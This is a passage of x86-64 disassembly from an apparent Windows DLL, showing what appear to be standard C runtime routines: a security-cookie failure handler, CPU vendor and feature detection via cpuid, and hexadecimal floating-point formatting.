   180006513:	cc                   	int3
   180006514:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   180006519:	48 83 ec 38          	sub    $0x38,%rsp
   18000651d:	b9 17 00 00 00       	mov    $0x17,%ecx
   180006522:	e8 49 9b 00 00       	call   0x180010070
   180006527:	85 c0                	test   %eax,%eax
   180006529:	74 07                	je     0x180006532
   18000652b:	b9 02 00 00 00       	mov    $0x2,%ecx
   180006530:	cd 29                	int    $0x29
   180006532:	48 8d 0d 87 43 01 00 	lea    0x14387(%rip),%rcx        # 0x18001a8c0
   180006539:	e8 66 36 00 00       	call   0x180009ba4
   18000653e:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   180006543:	48 89 05 6e 44 01 00 	mov    %rax,0x1446e(%rip)        # 0x18001a9b8
   18000654a:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   18000654f:	48 83 c0 08          	add    $0x8,%rax
   180006553:	48 89 05 fe 43 01 00 	mov    %rax,0x143fe(%rip)        # 0x18001a958
   18000655a:	48 8b 05 57 44 01 00 	mov    0x14457(%rip),%rax        # 0x18001a9b8
   180006561:	48 89 05 c8 42 01 00 	mov    %rax,0x142c8(%rip)        # 0x18001a830
   180006568:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   18000656d:	48 89 05 cc 43 01 00 	mov    %rax,0x143cc(%rip)        # 0x18001a940
   180006574:	c7 05 a2 42 01 00 09 	movl   $0xc0000409,0x142a2(%rip)        # 0x18001a820
   18000657b:	04 00 c0 
   18000657e:	c7 05 9c 42 01 00 01 	movl   $0x1,0x1429c(%rip)        # 0x18001a824
   180006585:	00 00 00 
   180006588:	c7 05 a6 42 01 00 01 	movl   $0x1,0x142a6(%rip)        # 0x18001a838
   18000658f:	00 00 00 
   180006592:	b8 08 00 00 00       	mov    $0x8,%eax
   180006597:	48 6b c0 00          	imul   $0x0,%rax,%rax
   18000659b:	48 8d 0d 9e 42 01 00 	lea    0x1429e(%rip),%rcx        # 0x18001a840
   1800065a2:	48 c7 04 01 02 00 00 	movq   $0x2,(%rcx,%rax,1)
   1800065a9:	00 
   1800065aa:	b8 08 00 00 00       	mov    $0x8,%eax
   1800065af:	48 6b c0 00          	imul   $0x0,%rax,%rax
   1800065b3:	48 8b 0d 46 2a 01 00 	mov    0x12a46(%rip),%rcx        # 0x180019000
   1800065ba:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   1800065bf:	b8 08 00 00 00       	mov    $0x8,%eax
   1800065c4:	48 6b c0 01          	imul   $0x1,%rax,%rax
   1800065c8:	48 8b 0d 39 2a 01 00 	mov    0x12a39(%rip),%rcx        # 0x180019008
   1800065cf:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   1800065d4:	48 8d 0d 0d b2 00 00 	lea    0xb20d(%rip),%rcx        # 0x1800117e8
   1800065db:	e8 e8 fe ff ff       	call   0x1800064c8
   1800065e0:	48 83 c4 38          	add    $0x38,%rsp
   1800065e4:	c3                   	ret
   1800065e5:	cc                   	int3
   1800065e6:	cc                   	int3
   1800065e7:	cc                   	int3
   1800065e8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800065ed:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1800065f2:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1800065f7:	57                   	push   %rdi
   1800065f8:	48 83 ec 10          	sub    $0x10,%rsp
   1800065fc:	33 c9                	xor    %ecx,%ecx
   1800065fe:	33 c0                	xor    %eax,%eax
   180006600:	33 ff                	xor    %edi,%edi
   180006602:	0f a2                	cpuid
   180006604:	c7 05 16 2a 01 00 02 	movl   $0x2,0x12a16(%rip)        # 0x180019024
   18000660b:	00 00 00 
   18000660e:	c7 05 08 2a 01 00 01 	movl   $0x1,0x12a08(%rip)        # 0x180019020
   180006615:	00 00 00 
   180006618:	44 8b db             	mov    %ebx,%r11d
   18000661b:	8b d9                	mov    %ecx,%ebx
   18000661d:	44 8b c2             	mov    %edx,%r8d
   180006620:	81 f3 6e 74 65 6c    	xor    $0x6c65746e,%ebx
   180006626:	44 8b ca             	mov    %edx,%r9d
   180006629:	41 8b d3             	mov    %r11d,%edx
   18000662c:	41 81 f0 69 6e 65 49 	xor    $0x49656e69,%r8d
   180006633:	81 f2 47 65 6e 75    	xor    $0x756e6547,%edx
   180006639:	8b e8                	mov    %eax,%ebp
   18000663b:	44 0b c3             	or     %ebx,%r8d
   18000663e:	8d 47 01             	lea    0x1(%rdi),%eax
   180006641:	44 0b c2             	or     %edx,%r8d
   180006644:	41 0f 94 c2          	sete   %r10b
   180006648:	41 81 f3 41 75 74 68 	xor    $0x68747541,%r11d
   18000664f:	41 81 f1 65 6e 74 69 	xor    $0x69746e65,%r9d
   180006656:	45 0b d9             	or     %r9d,%r11d
   180006659:	81 f1 63 41 4d 44    	xor    $0x444d4163,%ecx
   18000665f:	44 0b d9             	or     %ecx,%r11d
   180006662:	40 0f 94 c6          	sete   %sil
   180006666:	33 c9                	xor    %ecx,%ecx
   180006668:	0f a2                	cpuid
   18000666a:	44 8b d9             	mov    %ecx,%r11d
   18000666d:	44 8b c8             	mov    %eax,%r9d
   180006670:	89 5c 24 04          	mov    %ebx,0x4(%rsp)
   180006674:	89 54 24 0c          	mov    %edx,0xc(%rsp)
   180006678:	45 84 d2             	test   %r10b,%r10b
   18000667b:	74 4f                	je     0x1800066cc
   18000667d:	8b d0                	mov    %eax,%edx
   18000667f:	81 e2 f0 3f ff 0f    	and    $0xfff3ff0,%edx
   180006685:	81 fa c0 06 01 00    	cmp    $0x106c0,%edx
   18000668b:	74 2b                	je     0x1800066b8
   18000668d:	81 fa 60 06 02 00    	cmp    $0x20660,%edx
   180006693:	74 23                	je     0x1800066b8
   180006695:	81 fa 70 06 02 00    	cmp    $0x20670,%edx
   18000669b:	74 1b                	je     0x1800066b8
   18000669d:	81 c2 b0 f9 fc ff    	add    $0xfffcf9b0,%edx
   1800066a3:	83 fa 20             	cmp    $0x20,%edx
   1800066a6:	77 24                	ja     0x1800066cc
   1800066a8:	48 b9 01 00 01 00 01 	movabs $0x100010001,%rcx
   1800066af:	00 00 00 
   1800066b2:	48 0f a3 d1          	bt     %rdx,%rcx
   1800066b6:	73 14                	jae    0x1800066cc
   1800066b8:	44 8b 05 d5 46 01 00 	mov    0x146d5(%rip),%r8d        # 0x18001ad94
   1800066bf:	41 83 c8 01          	or     $0x1,%r8d
   1800066c3:	44 89 05 ca 46 01 00 	mov    %r8d,0x146ca(%rip)        # 0x18001ad94
   1800066ca:	eb 07                	jmp    0x1800066d3
   1800066cc:	44 8b 05 c1 46 01 00 	mov    0x146c1(%rip),%r8d        # 0x18001ad94
   1800066d3:	40 84 f6             	test   %sil,%sil
   1800066d6:	74 1b                	je     0x1800066f3
   1800066d8:	41 81 e1 00 0f f0 0f 	and    $0xff00f00,%r9d
   1800066df:	41 81 f9 00 0f 60 00 	cmp    $0x600f00,%r9d
   1800066e6:	7c 0b                	jl     0x1800066f3
   1800066e8:	41 83 c8 04          	or     $0x4,%r8d
   1800066ec:	44 89 05 a1 46 01 00 	mov    %r8d,0x146a1(%rip)        # 0x18001ad94
   1800066f3:	b8 07 00 00 00       	mov    $0x7,%eax
   1800066f8:	3b e8                	cmp    %eax,%ebp
   1800066fa:	7c 22                	jl     0x18000671e
   1800066fc:	33 c9                	xor    %ecx,%ecx
   1800066fe:	0f a2                	cpuid
   180006700:	8b fb                	mov    %ebx,%edi
   180006702:	89 04 24             	mov    %eax,(%rsp)
   180006705:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   180006709:	89 54 24 0c          	mov    %edx,0xc(%rsp)
   18000670d:	0f ba e3 09          	bt     $0x9,%ebx
   180006711:	73 0b                	jae    0x18000671e
   180006713:	41 83 c8 02          	or     $0x2,%r8d
   180006717:	44 89 05 76 46 01 00 	mov    %r8d,0x14676(%rip)        # 0x18001ad94
   18000671e:	41 0f ba e3 14       	bt     $0x14,%r11d
   180006723:	73 50                	jae    0x180006775
   180006725:	c7 05 f1 28 01 00 02 	movl   $0x2,0x128f1(%rip)        # 0x180019020
   18000672c:	00 00 00 
   18000672f:	c7 05 eb 28 01 00 06 	movl   $0x6,0x128eb(%rip)        # 0x180019024
   180006736:	00 00 00 
   180006739:	41 0f ba e3 1b       	bt     $0x1b,%r11d
   18000673e:	73 35                	jae    0x180006775
   180006740:	41 0f ba e3 1c       	bt     $0x1c,%r11d
   180006745:	73 2e                	jae    0x180006775
   180006747:	c7 05 cf 28 01 00 03 	movl   $0x3,0x128cf(%rip)        # 0x180019020
   18000674e:	00 00 00 
   180006751:	c7 05 c9 28 01 00 0e 	movl   $0xe,0x128c9(%rip)        # 0x180019024
   180006758:	00 00 00 
   18000675b:	40 f6 c7 20          	test   $0x20,%dil
   18000675f:	74 14                	je     0x180006775
   180006761:	c7 05 b5 28 01 00 05 	movl   $0x5,0x128b5(%rip)        # 0x180019020
   180006768:	00 00 00 
   18000676b:	c7 05 af 28 01 00 2e 	movl   $0x2e,0x128af(%rip)        # 0x180019024
   180006772:	00 00 00 
   180006775:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   18000677a:	48 8b 6c 24 28       	mov    0x28(%rsp),%rbp
   18000677f:	48 8b 74 24 30       	mov    0x30(%rsp),%rsi
   180006784:	33 c0                	xor    %eax,%eax
   180006786:	48 83 c4 10          	add    $0x10,%rsp
   18000678a:	5f                   	pop    %rdi
   18000678b:	c3                   	ret
   18000678c:	48 83 ec 48          	sub    $0x48,%rsp
   180006790:	8b 44 24 78          	mov    0x78(%rsp),%eax
   180006794:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   18000679a:	89 44 24 28          	mov    %eax,0x28(%rsp)
   18000679e:	8b 44 24 70          	mov    0x70(%rsp),%eax
   1800067a2:	89 44 24 20          	mov    %eax,0x20(%rsp)
   1800067a6:	e8 05 00 00 00       	call   0x1800067b0
   1800067ab:	48 83 c4 48          	add    $0x48,%rsp
   1800067af:	c3                   	ret
   1800067b0:	48 83 ec 38          	sub    $0x38,%rsp
   1800067b4:	41 8d 41 bb          	lea    -0x45(%r9),%eax
   1800067b8:	41 ba df ff ff ff    	mov    $0xffffffdf,%r10d
   1800067be:	41 85 c2             	test   %eax,%r10d
   1800067c1:	74 4a                	je     0x18000680d
   1800067c3:	41 83 f9 66          	cmp    $0x66,%r9d
   1800067c7:	75 16                	jne    0x1800067df
   1800067c9:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   1800067ce:	44 8b 4c 24 60       	mov    0x60(%rsp),%r9d
   1800067d3:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1800067d8:	e8 5b 08 00 00       	call   0x180007038
   1800067dd:	eb 4a                	jmp    0x180006829
   1800067df:	41 8d 41 bf          	lea    -0x41(%r9),%eax
   1800067e3:	44 8b 4c 24 60       	mov    0x60(%rsp),%r9d
   1800067e8:	41 85 c2             	test   %eax,%r10d
   1800067eb:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   1800067f0:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1800067f5:	8b 44 24 68          	mov    0x68(%rsp),%eax
   1800067f9:	89 44 24 20          	mov    %eax,0x20(%rsp)
   1800067fd:	74 07                	je     0x180006806
   1800067ff:	e8 08 09 00 00       	call   0x18000710c
   180006804:	eb 23                	jmp    0x180006829
   180006806:	e8 25 00 00 00       	call   0x180006830
   18000680b:	eb 1c                	jmp    0x180006829
   18000680d:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   180006812:	44 8b 4c 24 60       	mov    0x60(%rsp),%r9d
   180006817:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   18000681c:	8b 44 24 68          	mov    0x68(%rsp),%eax
   180006820:	89 44 24 20          	mov    %eax,0x20(%rsp)
   180006824:	e8 b3 05 00 00       	call   0x180006ddc
   180006829:	48 83 c4 38          	add    $0x38,%rsp
   18000682d:	c3                   	ret
   18000682e:	cc                   	int3
   18000682f:	cc                   	int3
   180006830:	48 8b c4             	mov    %rsp,%rax
   180006833:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180006837:	48 89 68 10          	mov    %rbp,0x10(%rax)
   18000683b:	48 89 70 18          	mov    %rsi,0x18(%rax)
   18000683f:	57                   	push   %rdi
   180006840:	41 54                	push   %r12
   180006842:	41 55                	push   %r13
   180006844:	41 56                	push   %r14
   180006846:	41 57                	push   %r15
   180006848:	48 83 ec 50          	sub    $0x50,%rsp
   18000684c:	48 8b fa             	mov    %rdx,%rdi
   18000684f:	48 8b 94 24 a8 00 00 	mov    0xa8(%rsp),%rdx
   180006856:	00 
   180006857:	4c 8b f1             	mov    %rcx,%r14
   18000685a:	48 8d 48 b8          	lea    -0x48(%rax),%rcx
   18000685e:	41 bf 30 00 00 00    	mov    $0x30,%r15d
   180006864:	41 8b d9             	mov    %r9d,%ebx
   180006867:	49 8b f0             	mov    %r8,%rsi
   18000686a:	41 bc ff 03 00 00    	mov    $0x3ff,%r12d
   180006870:	41 0f b7 ef          	movzwl %r15w,%ebp
   180006874:	e8 7b f6 ff ff       	call   0x180005ef4
   180006879:	45 33 c9             	xor    %r9d,%r9d
   18000687c:	85 db                	test   %ebx,%ebx
   18000687e:	41 0f 48 d9          	cmovs  %r9d,%ebx
   180006882:	48 85 ff             	test   %rdi,%rdi
   180006885:	75 0c                	jne    0x180006893
   180006887:	e8 a4 0d 00 00       	call   0x180007630
   18000688c:	bb 16 00 00 00       	mov    $0x16,%ebx
   180006891:	eb 1d                	jmp    0x1800068b0
   180006893:	48 85 f6             	test   %rsi,%rsi
   180006896:	74 ef                	je     0x180006887
   180006898:	8d 43 0b             	lea    0xb(%rbx),%eax
   18000689b:	44 88 0f             	mov    %r9b,(%rdi)
   18000689e:	48 63 c8             	movslq %eax,%rcx
   1800068a1:	48 3b f1             	cmp    %rcx,%rsi
   1800068a4:	77 19                	ja     0x1800068bf
   1800068a6:	e8 85 0d 00 00       	call   0x180007630
   1800068ab:	bb 22 00 00 00       	mov    $0x22,%ebx
   1800068b0:	89 18                	mov    %ebx,(%rax)
   1800068b2:	e8 ad 0c 00 00       	call   0x180007564
   1800068b7:	45 33 c9             	xor    %r9d,%r9d
   1800068ba:	e9 ee 02 00 00       	jmp    0x180006bad
   1800068bf:	49 8b 06             	mov    (%r14),%rax
   1800068c2:	b9 ff 07 00 00       	mov    $0x7ff,%ecx
   1800068c7:	48 c1 e8 34          	shr    $0x34,%rax
   1800068cb:	48 23 c1             	and    %rcx,%rax
   1800068ce:	48 3b c1             	cmp    %rcx,%rax
   1800068d1:	0f 85 92 00 00 00    	jne    0x180006969
   1800068d7:	4c 89 4c 24 28       	mov    %r9,0x28(%rsp)
   1800068dc:	44 89 4c 24 20       	mov    %r9d,0x20(%rsp)
   1800068e1:	4c 8d 46 fe          	lea    -0x2(%rsi),%r8
   1800068e5:	48 83 fe ff          	cmp    $0xffffffffffffffff,%rsi
   1800068e9:	48 8d 57 02          	lea    0x2(%rdi),%rdx
   1800068ed:	44 8b cb             	mov    %ebx,%r9d
   1800068f0:	4c 0f 44 c6          	cmove  %rsi,%r8
   1800068f4:	49 8b ce             	mov    %r14,%rcx
   1800068f7:	e8 e0 04 00 00       	call   0x180006ddc
   1800068fc:	45 33 c9             	xor    %r9d,%r9d
   1800068ff:	8b d8                	mov    %eax,%ebx
   180006901:	85 c0                	test   %eax,%eax
   180006903:	74 08                	je     0x18000690d
   180006905:	44 88 0f             	mov    %r9b,(%rdi)
   180006908:	e9 a0 02 00 00       	jmp    0x180006bad
   18000690d:	80 7f 02 2d          	cmpb   $0x2d,0x2(%rdi)
   180006911:	be 01 00 00 00       	mov    $0x1,%esi
   180006916:	75 06                	jne    0x18000691e
   180006918:	c6 07 2d             	movb   $0x2d,(%rdi)
   18000691b:	48 03 fe             	add    %rsi,%rdi
   18000691e:	8b 9c 24 a0 00 00 00 	mov    0xa0(%rsp),%ebx
   180006925:	44 88 3f             	mov    %r15b,(%rdi)
   180006928:	ba 65 00 00 00       	mov    $0x65,%edx
   18000692d:	8b c3                	mov    %ebx,%eax
   18000692f:	f7 d8                	neg    %eax
   180006931:	1a c9                	sbb    %cl,%cl
   180006933:	80 e1 e0             	and    $0xe0,%cl
   180006936:	80 c1 78             	add    $0x78,%cl
   180006939:	88 0c 37             	mov    %cl,(%rdi,%rsi,1)
   18000693c:	48 8d 4e 01          	lea    0x1(%rsi),%rcx
   180006940:	48 03 cf             	add    %rdi,%rcx
   180006943:	e8 80 3e 00 00       	call   0x18000a7c8
   180006948:	45 33 c9             	xor    %r9d,%r9d
   18000694b:	48 85 c0             	test   %rax,%rax
   18000694e:	0f 84 56 02 00 00    	je     0x180006baa
   180006954:	f7 db                	neg    %ebx
   180006956:	1a c9                	sbb    %cl,%cl
   180006958:	80 e1 e0             	and    $0xe0,%cl
   18000695b:	80 c1 70             	add    $0x70,%cl
   18000695e:	88 08                	mov    %cl,(%rax)
   180006960:	44 88 48 03          	mov    %r9b,0x3(%rax)
   180006964:	e9 41 02 00 00       	jmp    0x180006baa
   180006969:	48 b8 00 00 00 00 00 	movabs $0x8000000000000000,%rax
   180006970:	00 00 80 
   180006973:	be 01 00 00 00       	mov    $0x1,%esi
   180006978:	49 85 06             	test   %rax,(%r14)
   18000697b:	74 06                	je     0x180006983
   18000697d:	c6 07 2d             	movb   $0x2d,(%rdi)
   180006980:	48 03 fe             	add    %rsi,%rdi
   180006983:	44 8b ac 24 a0 00 00 	mov    0xa0(%rsp),%r13d
   18000698a:	00 
   18000698b:	45 8b d7             	mov    %r15d,%r10d
   18000698e:	49 bb ff ff ff ff ff 	movabs $0xfffffffffffff,%r11
   180006995:	ff 0f 00 
   180006998:	44 88 17             	mov    %r10b,(%rdi)
   18000699b:	48 03 fe             	add    %rsi,%rdi
   18000699e:	41 8b c5             	mov    %r13d,%eax
   1800069a1:	f7 d8                	neg    %eax
   1800069a3:	41 8b c5             	mov    %r13d,%eax
   1800069a6:	1a c9                	sbb    %cl,%cl
   1800069a8:	80 e1 e0             	and    $0xe0,%cl
   1800069ab:	80 c1 78             	add    $0x78,%cl
   1800069ae:	88 0f                	mov    %cl,(%rdi)
   1800069b0:	48 03 fe             	add    %rsi,%rdi
   1800069b3:	f7 d8                	neg    %eax
   1800069b5:	1b d2                	sbb    %edx,%edx
   1800069b7:	48 b8 00 00 00 00 00 	movabs $0x7ff0000000000000,%rax
   1800069be:	00 f0 7f 
   1800069c1:	83 e2 e0             	and    $0xffffffe0,%edx
   1800069c4:	83 ea d9             	sub    $0xffffffd9,%edx
   1800069c7:	49 85 06             	test   %rax,(%r14)
   1800069ca:	75 1b                	jne    0x1800069e7
   1800069cc:	44 88 17             	mov    %r10b,(%rdi)
   1800069cf:	49 8b 06             	mov    (%r14),%rax
   1800069d2:	48 03 fe             	add    %rsi,%rdi
   1800069d5:	49 23 c3             	and    %r11,%rax
   1800069d8:	48 f7 d8             	neg    %rax
   1800069db:	4d 1b e4             	sbb    %r12,%r12
   1800069de:	41 81 e4 fe 03 00 00 	and    $0x3fe,%r12d
   1800069e5:	eb 06                	jmp    0x1800069ed
   1800069e7:	c6 07 31             	movb   $0x31,(%rdi)
   1800069ea:	48 03 fe             	add    %rsi,%rdi
   1800069ed:	4c 8b ff             	mov    %rdi,%r15
   1800069f0:	48 03 fe             	add    %rsi,%rdi
   1800069f3:	85 db                	test   %ebx,%ebx
   1800069f5:	75 05                	jne    0x1800069fc
   1800069f7:	45 88 0f             	mov    %r9b,(%r15)
   1800069fa:	eb 14                	jmp    0x180006a10
   1800069fc:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   180006a01:	48 8b 88 f0 00 00 00 	mov    0xf0(%rax),%rcx
   180006a08:	48 8b 01             	mov    (%rcx),%rax
   180006a0b:	8a 08                	mov    (%rax),%cl
   180006a0d:	41 88 0f             	mov    %cl,(%r15)
   180006a10:	4d 85 1e             	test   %r11,(%r14)
   180006a13:	0f 86 88 00 00 00    	jbe    0x180006aa1
   180006a19:	49 b8 00 00 00 00 00 	movabs $0xf000000000000,%r8
   180006a20:	00 0f 00 
   180006a23:	85 db                	test   %ebx,%ebx
   180006a25:	7e 2d                	jle    0x180006a54
   180006a27:	49 8b 06             	mov    (%r14),%rax
   180006a2a:	40 8a cd             	mov    %bpl,%cl
   180006a2d:	49 23 c0             	and    %r8,%rax
   180006a30:	49 23 c3             	and    %r11,%rax
   180006a33:	48 d3 e8             	shr    %cl,%rax
   180006a36:	66 41 03 c2          	add    %r10w,%ax
   180006a3a:	66 83 f8 39          	cmp    $0x39,%ax
   180006a3e:	76 03                	jbe    0x180006a43
   180006a40:	66 03 c2             	add    %dx,%ax
   180006a43:	88 07                	mov    %al,(%rdi)
   180006a45:	49 c1 e8 04          	shr    $0x4,%r8
   180006a49:	2b de                	sub    %esi,%ebx
   180006a4b:	48 03 fe             	add    %rsi,%rdi
   180006a4e:	66 83 c5 fc          	add    $0xfffc,%bp
   180006a52:	79 cf                	jns    0x180006a23
   180006a54:	66 85 ed             	test   %bp,%bp
   180006a57:	78 48                	js     0x180006aa1
   180006a59:	49 8b 06             	mov    (%r14),%rax
   180006a5c:	40 8a cd             	mov    %bpl,%cl
   180006a5f:	49 23 c0             	and    %r8,%rax
   180006a62:	49 23 c3             	and    %r11,%rax
   180006a65:	48 d3 e8             	shr    %cl,%rax
   180006a68:	66 83 f8 08          	cmp    $0x8,%ax
   180006a6c:	76 33                	jbe    0x180006aa1
   180006a6e:	48 8d 4f ff          	lea    -0x1(%rdi),%rcx
   180006a72:	8a 01                	mov    (%rcx),%al
   180006a74:	2c 46                	sub    $0x46,%al
   180006a76:	a8 df                	test   $0xdf,%al
   180006a78:	75 08                	jne    0x180006a82
   180006a7a:	44 88 11             	mov    %r10b,(%rcx)
   180006a7d:	48 2b ce             	sub    %rsi,%rcx
   180006a80:	eb f0                	jmp    0x180006a72
   180006a82:	49 3b cf             	cmp    %r15,%rcx
   180006a85:	74 14                	je     0x180006a9b
   180006a87:	8a 01                	mov    (%rcx),%al
   180006a89:	3c 39                	cmp    $0x39,%al
   180006a8b:	75 07                	jne    0x180006a94
   180006a8d:	80 c2 3a             	add    $0x3a,%dl
   180006a90:	88 11                	mov    %dl,(%rcx)
   180006a92:	eb 0d                	jmp    0x180006aa1
   180006a94:	40 02 c6             	add    %sil,%al
   180006a97:	88 01                	mov    %al,(%rcx)
   180006a99:	eb 06                	jmp    0x180006aa1
   180006a9b:	48 2b ce             	sub    %rsi,%rcx
   180006a9e:	40 00 31             	add    %sil,(%rcx)
   180006aa1:	85 db                	test   %ebx,%ebx
   180006aa3:	7e 18                	jle    0x180006abd
   180006aa5:	4c 8b c3             	mov    %rbx,%r8
   180006aa8:	41 8a d2             	mov    %r10b,%dl
   180006aab:	48 8b cf             	mov    %rdi,%rcx
   180006aae:	e8 ad e7 ff ff       	call   0x180005260
   180006ab3:	48 03 fb             	add    %rbx,%rdi
   180006ab6:	45 33 c9             	xor    %r9d,%r9d
   180006ab9:	45 8d 51 30          	lea    0x30(%r9),%r10d
   180006abd:	45 38 0f             	cmp    %r9b,(%r15)
   180006ac0:	49 0f 44 ff          	cmove  %r15,%rdi
   180006ac4:	41 f7 dd             	neg    %r13d
   180006ac7:	1a c0                	sbb    %al,%al
   180006ac9:	24 e0                	and    $0xe0,%al
   180006acb:	04 70                	add    $0x70,%al
   180006acd:	88 07                	mov    %al,(%rdi)
   180006acf:	49 8b 0e             	mov    (%r14),%rcx
   180006ad2:	48 03 fe             	add    %rsi,%rdi
   180006ad5:	48 c1 e9 34          	shr    $0x34,%rcx
   180006ad9:	81 e1 ff 07 00 00    	and    $0x7ff,%ecx
   180006adf:	49 2b cc             	sub    %r12,%rcx
   180006ae2:	78 08                	js     0x180006aec
   180006ae4:	c6 07 2b             	movb   $0x2b,(%rdi)
   180006ae7:	48 03 fe             	add    %rsi,%rdi
   180006aea:	eb 09                	jmp    0x180006af5
   180006aec:	c6 07 2d             	movb   $0x2d,(%rdi)
   180006aef:	48 03 fe             	add    %rsi,%rdi
   180006af2:	48 f7 d9             	neg    %rcx
   180006af5:	4c 8b c7             	mov    %rdi,%r8
   180006af8:	44 88 17             	mov    %r10b,(%rdi)
   180006afb:	48 81 f9 e8 03 00 00 	cmp    $0x3e8,%rcx
   180006b02:	7c 33                	jl     0x180006b37
   180006b04:	48 b8 cf f7 53 e3 a5 	movabs $0x20c49ba5e353f7cf,%rax
   180006b0b:	9b c4 20 
   180006b0e:	48 f7 e9             	imul   %rcx
   180006b11:	48 c1 fa 07          	sar    $0x7,%rdx
   180006b15:	48 8b c2             	mov    %rdx,%rax
   180006b18:	48 c1 e8 3f          	shr    $0x3f,%rax
   180006b1c:	48 03 d0             	add    %rax,%rdx
   180006b1f:	41 8d 04 12          	lea    (%r10,%rdx,1),%eax
   180006b23:	88 07                	mov    %al,(%rdi)
   180006b25:	48 03 fe             	add    %rsi,%rdi
   180006b28:	48 69 c2 18 fc ff ff 	imul   $0xfffffffffffffc18,%rdx,%rax
   180006b2f:	48 03 c8             	add    %rax,%rcx
   180006b32:	49 3b f8             	cmp    %r8,%rdi
   180006b35:	75 06                	jne    0x180006b3d
   180006b37:	48 83 f9 64          	cmp    $0x64,%rcx
   180006b3b:	7c 2e                	jl     0x180006b6b
   180006b3d:	48 b8 0b d7 a3 70 3d 	movabs $0xa3d70a3d70a3d70b,%rax
   180006b44:	0a d7 a3 
   180006b47:	48 f7 e9             	imul   %rcx
   180006b4a:	48 03 d1             	add    %rcx,%rdx
   180006b4d:	48 c1 fa 06          	sar    $0x6,%rdx
   180006b51:	48 8b c2             	mov    %rdx,%rax
   180006b54:	48 c1 e8 3f          	shr    $0x3f,%rax
   180006b58:	48 03 d0             	add    %rax,%rdx
   180006b5b:	41 8d 04 12          	lea    (%r10,%rdx,1),%eax
   180006b5f:	88 07                	mov    %al,(%rdi)
   180006b61:	48 03 fe             	add    %rsi,%rdi
   180006b64:	48 6b c2 9c          	imul   $0xffffffffffffff9c,%rdx,%rax
   180006b68:	48 03 c8             	add    %rax,%rcx
   180006b6b:	49 3b f8             	cmp    %r8,%rdi
   180006b6e:	75 06                	jne    0x180006b76
   180006b70:	48 83 f9 0a          	cmp    $0xa,%rcx
   180006b74:	7c 2b                	jl     0x180006ba1
   180006b76:	48 b8 67 66 66 66 66 	movabs $0x6666666666666667,%rax
   180006b7d:	66 66 66 
   180006b80:	48 f7 e9             	imul   %rcx
   180006b83:	48 c1 fa 02          	sar    $0x2,%rdx
   180006b87:	48 8b c2             	mov    %rdx,%rax
   180006b8a:	48 c1 e8 3f          	shr    $0x3f,%rax
   180006b8e:	48 03 d0             	add    %rax,%rdx
   180006b91:	41 8d 04 12          	lea    (%r10,%rdx,1),%eax
   180006b95:	88 07                	mov    %al,(%rdi)
   180006b97:	48 03 fe             	add    %rsi,%rdi
   180006b9a:	48 6b c2 f6          	imul   $0xfffffffffffffff6,%rdx,%rax
   180006b9e:	48 03 c8             	add    %rax,%rcx
   180006ba1:	41 02 ca             	add    %r10b,%cl
   180006ba4:	88 0f                	mov    %cl,(%rdi)
   180006ba6:	44 88 4f 01          	mov    %r9b,0x1(%rdi)
   180006baa:	41 8b d9             	mov    %r9d,%ebx
   180006bad:	44 38 4c 24 48       	cmp    %r9b,0x48(%rsp)
   180006bb2:	74 0c                	je     0x180006bc0
   180006bb4:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   180006bb9:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   180006bc0:	4c 8d 5c 24 50       	lea    0x50(%rsp),%r11
   180006bc5:	8b c3                	mov    %ebx,%eax
   180006bc7:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   180006bcb:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   180006bcf:	49 8b 73 40          	mov    0x40(%r11),%rsi
   180006bd3:	49 8b e3             	mov    %r11,%rsp
   180006bd6:	41 5f                	pop    %r15
   180006bd8:	41 5e                	pop    %r14
   180006bda:	41 5d                	pop    %r13
   180006bdc:	41 5c                	pop    %r12
   180006bde:	5f                   	pop    %rdi
   180006bdf:	c3                   	ret
   180006be0:	48 8b c4             	mov    %rsp,%rax
   180006be3:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180006be7:	48 89 68 10          	mov    %rbp,0x10(%rax)
   180006beb:	48 89 70 18          	mov    %rsi,0x18(%rax)
   180006bef:	48 89 78 20          	mov    %rdi,0x20(%rax)
   180006bf3:	41 55                	push   %r13
   180006bf5:	41 56                	push   %r14
   180006bf7:	41 57                	push   %r15
   180006bf9:	48 83 ec 50          	sub    $0x50,%rsp
   180006bfd:	4c 8b f2             	mov    %rdx,%r14
   180006c00:	48 8b 94 24 a0 00 00 	mov    0xa0(%rsp),%rdx
   180006c07:	00 
   180006c08:	48 8b f9             	mov    %rcx,%rdi
   180006c0b:	48 8d 48 c8          	lea    -0x38(%rax),%rcx
   180006c0f:	45 8b e9             	mov    %r9d,%r13d
   180006c12:	49 63 f0             	movslq %r8d,%rsi
   180006c15:	e8 da f2 ff ff       	call   0x180005ef4
   180006c1a:	48 85 ff             	test   %rdi,%rdi
   180006c1d:	74 05                	je     0x180006c24
   180006c1f:	4d 85 f6             	test   %r14,%r14
   180006c22:	75 0c                	jne    0x180006c30
   180006c24:	e8 07 0a 00 00       	call   0x180007630
   180006c29:	bb 16 00 00 00       	mov    $0x16,%ebx
   180006c2e:	eb 1b                	jmp    0x180006c4b
   180006c30:	33 c0                	xor    %eax,%eax
   180006c32:	85 f6                	test   %esi,%esi
   180006c34:	0f 4f c6             	cmovg  %esi,%eax
   180006c37:	83 c0 09             	add    $0x9,%eax
   180006c3a:	48 98                	cltq
